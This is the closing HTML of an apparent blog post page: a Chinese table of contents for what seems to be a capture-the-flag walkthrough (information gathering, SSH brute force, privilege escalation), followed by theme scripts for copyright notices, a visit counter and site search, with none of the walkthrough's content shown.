        </div>
    </div>
</div>

    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#关于"><span class="toc-number">1.</span> <span class="toc-text">关于</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#信息收集"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆破ssh"><span class="toc-number">3.</span> <span class="toc-text">爆破ssh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#提权GetFlag"><span class="toc-number">4.</span> <span class="toc-text">提权GetFlag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#记录"><span class="toc-number">5.</span> <span class="toc-text">记录</span></a></li></ol>




<script src="/js/search.js"></script>
<script type="text/javascript">
    //theme config datas
    var copyrightObj = {};
    copyrightObj.enable = 'true';
    copyrightObj.triggerCopyLength = '200';
    copyrightObj.appendText = '商业转载请联系作者获得授权,非商业转载请注明出处 © example';
    var leancloudObj = {};
    leancloudObj.enable = 'false';
    leancloudObj.className = 'BlogCounter';
    leancloudObj.limits = '10';
</script>
<script type="text/javascript">
    var search = {};
    var search_path = "search.xml";
    if (!search_path) {
        search_path = "search.xml";
    }
    search.path = "/" + search_path;
    search.func =  _ajax.init();
</script>
<script src="/js/app.js"></script>


</body>
</html>